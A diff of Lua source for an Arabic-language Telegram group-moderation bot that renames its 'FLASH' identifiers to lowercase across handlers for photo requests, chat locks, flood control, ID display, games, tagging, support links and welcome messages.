 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '8' then
 if result.photos_[7] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '9' then
 if result.photos_[8] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end
 elseif pronumb[2] == '10' then
 if result.photos_[9] then
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '️❅∫ انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
 end else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يمكنني ان ارسل لك اكثر من 10 صور ", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يمكنني ان ارسل لك اكثر من 10 صور ", 1, 'md')
 end end end
 tdcli_function ({
 ID = "GetUserProfilePhotos",
@@ -6962,9 +6962,9 @@ offset_ = 0,
 limit_ = pronumb[2]
 }, gproen, nil) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then 
-if text and text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+if text and text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 if is_leaderid(msg.sender_user_id_) then
 tar = 'المطور 🌟'
 elseif is_sudoid(msg.sender_user_id_) then
@@ -6986,156 +6986,156 @@ tar = 'الادمن 🥈'
 end
 local lockptf = {string.match(text, "^(قفل) (.*)$")} 
 if lockptf[2] == "التعديل" then
-if not FLASHdx1:get(FLASH..'editmsg'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التعديل  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'editmsg'..msg.chat_id_,true)
+if not flashdx1:get(flash..'editmsg'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التعديل  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'editmsg'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل التعديل سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل التعديل سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "الفارسيه" then
-if not FLASHdx1:get(FLASH..'farsi'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفارسيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'farsi'..msg.chat_id_,true)
+if not flashdx1:get(flash..'farsi'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفارسيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'farsi'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل الفارسيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل الفارسيه سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "الفارسيه بالطرد" then
-if not FLASHdx1:get(FLASH..'farsiban'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفارسيه بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 63, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'farsiban'..msg.chat_id_,true)
+if not flashdx1:get(flash..'farsiban'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفارسيه بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 63, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'farsiban'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل الفارسيه بالطرد سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل الفارسيه بالطرد سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "الشارحه" then
-if not FLASHdx1:get(FLASH..'bot:cmds'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الشارحه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:cmds'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:cmds'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الشارحه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:cmds'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل الشارحه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل الشارحه سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "البوتات" then
-if not FLASHdx1:get(FLASH..'bot:bots:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » البوتات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:bots:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:bots:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » البوتات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:bots:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل البوتات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل البوتات سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "البوتات بالطرد" then
-if not FLASHdx1:get(FLASH..'bot:bots:ban'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » البوتات بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 62, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:bots:ban'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:bots:ban'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » البوتات بالطرد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 62, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:bots:ban'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل البوتات بالطرد سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل البوتات بالطرد سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "البوتات بالتقييد" then
-if not FLASHdx1:get(FLASH..'keed_bots'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » البوتات بالتقييد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 64, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'keed_bots'..msg.chat_id_,true)
+if not flashdx1:get(flash..'keed_bots'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » البوتات بالتقييد  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 64, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'keed_bots'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل البوتات بالتقييد سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل البوتات بالتقييد سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "التكرار" then
-if not FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التكرار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'anti-flood:'..msg.chat_id_,true)
+if not flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التكرار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'anti-flood:'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل التكرار سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل التكرار سابقا ،', 1, 'md')
 end end
 if lockptf[2] == "التثبيت" then
-if not FLASHdx1:get(FLASH..'bot:pin:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التثبيت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:pin:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:pin:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التثبيت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:pin:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل التثبيت سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل التثبيت سابقا ،', 1, 'md')
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^ضع تكرار (%d+)$") then
 local floodmax = {string.match(text, "^(ضع تكرار) (%d+)$")}
 if tonumber(floodmax[2]) < 2 then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ قم بتحديد تكرار اكبر من 2 ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ قم بتحديد تكرار اكبر من 2 ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تحديد التكرار للعدد '..floodmax[2]..' ،', 1, 'md')
-FLASHdx1:set(FLASH..'flood:max:'..msg.chat_id_,floodmax[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تحديد التكرار للعدد '..floodmax[2]..' ،', 1, 'md')
+flashdx1:set(flash..'flood:max:'..msg.chat_id_,floodmax[2])
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^ضع التكرار (.*)$") then
 local status = {string.match(text, "^(ضع التكرار) (.*)$")}
 if status[2] == "بالطرد" then
-if FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) == "Kicked" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالطرد فعلا ،', 1, 'md')
+if flashdx1:get(flash..'floodstatus'..msg.chat_id_) == "Kicked" then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالطرد فعلا ،', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالطرد ،', 1, 'md')
-FLASHdx1:set(FLASH..'floodstatus'..msg.chat_id_,'Kicked')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالطرد ،', 1, 'md')
+flashdx1:set(flash..'floodstatus'..msg.chat_id_,'Kicked')
 end end
 if status[2] == "بالمسح" then
-if FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) == "DelMsg" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالمسح فعلا ،', 1, 'md')
+if flashdx1:get(flash..'floodstatus'..msg.chat_id_) == "DelMsg" then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالمسح فعلا ،', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالمسح ،', 1, 'md')
-FLASHdx1:set(FLASH..'floodstatus'..msg.chat_id_,'DelMsg')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع التكرار بالمسح ،', 1, 'md')
+flashdx1:set(flash..'floodstatus'..msg.chat_id_,'DelMsg')
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match("^ضع الفارسيه (.*)$") then
 local status = {string.match(text, "^(ضع الفارسيه) (.*)$")}
 if status[2] == "بالتحذير" then
-if FLASHdx1:get(FLASH..'far'..msg.chat_id_) == "thhhh" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بالتحذير فعلا ،', 1, 'md')
+if flashdx1:get(flash..'far'..msg.chat_id_) == "thhhh" then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بالتحذير فعلا ،', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بالتحذير ،', 1, 'md')
-FLASHdx1:set(FLASH..'far'..msg.chat_id_,'thhhh')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بالتحذير ،', 1, 'md')
+flashdx1:set(flash..'far'..msg.chat_id_,'thhhh')
 end end
 if status[2] == "بدون تحذير" then
-if FLASHdx1:get(FLASH..'far'..msg.chat_id_) == "bedthhh" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بدون تحذير فعلا ،', 1, 'md')
+if flashdx1:get(flash..'far'..msg.chat_id_) == "bedthhh" then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بدون تحذير فعلا ،', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بدون تحذير ،', 1, 'md')
-FLASHdx1:set(FLASH..'far'..msg.chat_id_,'bedthhh')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الفارسيه بدون تحذير ،', 1, 'md')
+flashdx1:set(flash..'far'..msg.chat_id_,'bedthhh')
 end end end
---     By Developer FLASH     -- 
-if (text and text == 'تفعيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get('FLASH:id:photo'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بالصوره فعلا ، ', 1, 'md')
+--     By Developer flash     -- 
+if (text and text == 'تفعيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get('flash:id:photo'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بالصوره فعلا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بالصوره ، ', 1, 'md')
-FLASHdx1:del('FLASH:id:photo'..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بالصوره ، ', 1, 'md')
+flashdx1:del('flash:id:photo'..msg.chat_id_)
 end end
-if (text and text == 'تعطيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get('FLASH:id:photo'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بدون صوره فعلا ، ', 1, 'md')
+if (text and text == 'تعطيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get('flash:id:photo'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بدون صوره فعلا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بدون صوره ، ', 1, 'md')
-FLASHdx1:set('FLASH:id:photo'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع الايدي بدون صوره ، ', 1, 'md')
+flashdx1:set('flash:id:photo'..msg.chat_id_,true)
  end end
- --     By Developer FLASH     -- 
-if (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get('FLASH:id:mute'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الايدي سابقا ، ', 1, 'md')
+ --     By Developer flash     -- 
+if (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get('flash:id:mute'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الايدي سابقا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الايدي ، ', 1, 'md')
-FLASHdx1:del('FLASH:id:mute'..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الايدي ، ', 1, 'md')
+flashdx1:del('flash:id:mute'..msg.chat_id_)
  end end
-if (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get('FLASH:id:mute'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الايدي سابقا ، ', 1, 'md')
+if (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get('flash:id:mute'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الايدي سابقا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الايدي ، ', 1, 'md')
-FLASHdx1:set('FLASH:id:mute'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الايدي ، ', 1, 'md')
+flashdx1:set('flash:id:mute'..msg.chat_id_,true)
  end end
- if (text and text == 'تفعيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or (text and text == 'تفعيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الالعاب سابقا ، ', 1, 'md')
+ if (text and text == 'تفعيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or (text and text == 'تفعيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الالعاب سابقا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1,[[*
+flashdx(msg.chat_id_, msg.id_, 1,[[*
 ❅∫ اهلا بك في قائمه الالعاب ↓↓
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ الالعاب المتوفره بالبوت ↓↓
@@ -7155,183 +7155,183 @@ FLASHdx(msg.chat_id_, msg.id_, 1,[[*
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ قناة السورس *[@FAQY4] 
 ]], 1, 'md')
-FLASHdx1:del(FLASH..'bot:lock_geam'..msg.chat_id_)
+flashdx1:del(flash..'bot:lock_geam'..msg.chat_id_)
  end end
-if (text and text == 'تعطيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) or (text and text == 'تعطيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الالعاب سابقا ، ', 1, 'md')
+if (text and text == 'تعطيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) or (text and text == 'تعطيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الالعاب سابقا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الالعاب ، ', 1, 'md')
-FLASHdx1:set(FLASH..'bot:lock_geam'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الالعاب ، ', 1, 'md')
+flashdx1:set(flash..'bot:lock_geam'..msg.chat_id_,true)
  end end
  
  
- if (text and text == 'تفعيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get(FLASH..'bot:lock_tag'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل تاك الكل سابقا ، ', 1, 'md')
+ if (text and text == 'تفعيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get(flash..'bot:lock_tag'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل تاك الكل سابقا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل تاك الكل ، ', 1, 'md')
-FLASHdx1:del(FLASH..'bot:lock_tag'..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل تاك الكل ، ', 1, 'md')
+flashdx1:del(flash..'bot:lock_tag'..msg.chat_id_)
  end end
-if (text and text == 'تعطيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_tag'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل تاك الكل سابقا ، ', 1, 'md')
+if (text and text == 'تعطيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_tag'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل تاك الكل سابقا ، ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل تاك الكل ، ', 1, 'md')
-FLASHdx1:set(FLASH..'bot:lock_tag'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل تاك الكل ، ', 1, 'md')
+flashdx1:set(flash..'bot:lock_tag'..msg.chat_id_,true)
  end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل رابط المجموعه ليتم حفظه ، ', 1, 'md')
-FLASHdx1:setex(FLASH.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل رابط المجموعه ليتم حفظه ، ', 1, 'md')
+flashdx1:setex(flash.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
 end
---     By Developer FLASH     -- 
-if text == "الدعم" or text == "المطور" and FLASH11(msg) then
-local link = FLASHdx1:get(FLASH.."bot:supports:link")
+--     By Developer flash     -- 
+if text == "الدعم" or text == "المطور" and flash11(msg) then
+local link = flashdx1:get(flash.."bot:supports:link")
 if link then
 if link:match("https://") then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من جروب الدعم \n❅∫ رابط جروب دعم البوت \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n " .. link, 1, "html")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من جروب الدعم \n❅∫ رابط جروب دعم البوت \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n " .. link, 1, "html")
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من بوت التواصل \n❅∫ معرف بوت تواصل المطور \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n @" .. link, 1, "html")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من بوت التواصل \n❅∫ معرف بوت تواصل المطور \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n @" .. link, 1, "html")
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^تفعيل الترحيب$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الترحيب ، ', 1, 'md')
-FLASHdx1:set(FLASH.."bot:welcome"..msg.chat_id_,true)
+if text and text:match("^تفعيل الترحيب$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الترحيب ، ', 1, 'md')
+flashdx1:set(flash.."bot:welcome"..msg.chat_id_,true)
 end
-if text and text:match("^تعطيل الترحيب$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الترحيب ، ', 1, 'md')
-FLASHdx1:del(FLASH.."bot:welcome"..msg.chat_id_)
+if text and text:match("^تعطيل الترحيب$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الترحيب ، ', 1, 'md')
+flashdx1:del(flash.."bot:welcome"..msg.chat_id_)
 end
-if FLASHdx1:get(FLASH..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
+if flashdx1:get(flash..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
 if text == 'الغاء' then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء حفظ الترحيب ،", 1, "md")
